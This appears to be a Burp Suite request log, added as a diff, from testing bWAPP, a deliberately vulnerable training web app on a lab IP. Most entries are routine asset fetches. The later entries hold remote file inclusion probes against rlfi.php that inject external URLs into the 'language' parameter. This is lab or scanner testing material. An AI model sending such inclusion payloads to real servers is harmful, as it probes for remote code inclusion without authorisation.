+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/stylesheets/stylesheet.css HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=00jtf56fpbluq1psidgmts21j5
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/favicon.ico HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=00jtf56fpbluq1psidgmts21j5
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/blogger.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=00jtf56fpbluq1psidgmts21j5
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/linkedin.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=00jtf56fpbluq1psidgmts21j5
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/twitter.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=00jtf56fpbluq1psidgmts21j5
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/facebook.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=00jtf56fpbluq1psidgmts21j5
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bee_1.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=00jtf56fpbluq1psidgmts21j5
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/blogger.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=mpbnp30le5ovl7bi60pi1o9oi1
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/twitter.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=mpbnp30le5ovl7bi60pi1o9oi1
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/linkedin.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=mpbnp30le5ovl7bi60pi1o9oi1
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/facebook.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=mpbnp30le5ovl7bi60pi1o9oi1
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bee_1.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=mpbnp30le5ovl7bi60pi1o9oi1
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/stylesheets/stylesheet.css HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/css,*/*;q=0.1
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=mpbnp30le5ovl7bi60pi1o9oi1
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_3.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=mpbnp30le5ovl7bi60pi1o9oi1
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/sb_1.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=mpbnp30le5ovl7bi60pi1o9oi1
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_1.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=mpbnp30le5ovl7bi60pi1o9oi1
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_2.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=mpbnp30le5ovl7bi60pi1o9oi1
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/favicon.ico HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=mpbnp30le5ovl7bi60pi1o9oi1
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/twitter.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/rlfi.php
+Cookie: PHPSESSID=69c3inu8c77jdotnlvkujksdo6
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/facebook.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/rlfi.php
+Cookie: PHPSESSID=69c3inu8c77jdotnlvkujksdo6
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/blogger.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/rlfi.php
+Cookie: PHPSESSID=69c3inu8c77jdotnlvkujksdo6
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bee_1.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/rlfi.php
+Cookie: PHPSESSID=69c3inu8c77jdotnlvkujksdo6
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/stylesheets/stylesheet.css HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/css,*/*;q=0.1
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/rlfi.php?name=abc
+Cookie: PHPSESSID=69c3inu8c77jdotnlvkujksdo6
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/linkedin.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/rlfi.php
+Cookie: PHPSESSID=69c3inu8c77jdotnlvkujksdo6
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/stylesheets/stylesheet.css HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/css,*/*;q=0.1
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/rlfi.php
+Cookie: PHPSESSID=69c3inu8c77jdotnlvkujksdo6
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/facebook.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/rlfi.php?name=abc
+Cookie: PHPSESSID=69c3inu8c77jdotnlvkujksdo6
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bee_1.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/rlfi.php?name=abc
+Cookie: PHPSESSID=69c3inu8c77jdotnlvkujksdo6
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/blogger.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/rlfi.php?name=abc
+Cookie: PHPSESSID=69c3inu8c77jdotnlvkujksdo6
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/linkedin.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/rlfi.php?name=abc
+Cookie: PHPSESSID=69c3inu8c77jdotnlvkujksdo6
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/8813187930812687989.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/4178681484164739202 HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/js/671351297961591091 HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/xss_post.php
+Sec-Fetch-Dest: script
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/stylesheets/7262994750970920582 HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/css,*/*;q=0.1
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/xss_post.php
+Sec-Fetch-Dest: style
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=http%3A%2F%2Fwww.google.com%2F&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=http%3A%2F%2Fwww.google.com%3A80%2F&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=http%3A%2F%2Fwww.google.com&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=www.google.com%2F&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=www.google.com%3A80%2F&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=www.google.com&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=www.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=www.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=HTTP%3A%2F%2Fwww.google.com%2F&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=HTTP%3A%2F%2Fwww.google.com%3A80%2F&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=HTTP%3A%2F%2Fwww.google.com&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=HTTP%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=HTTP%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=https%3A%2F%2Fwww.google.com%2F&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=https%3A%2F%2Fwww.google.com%3A80%2F&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=https%3A%2F%2Fwww.google.com&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
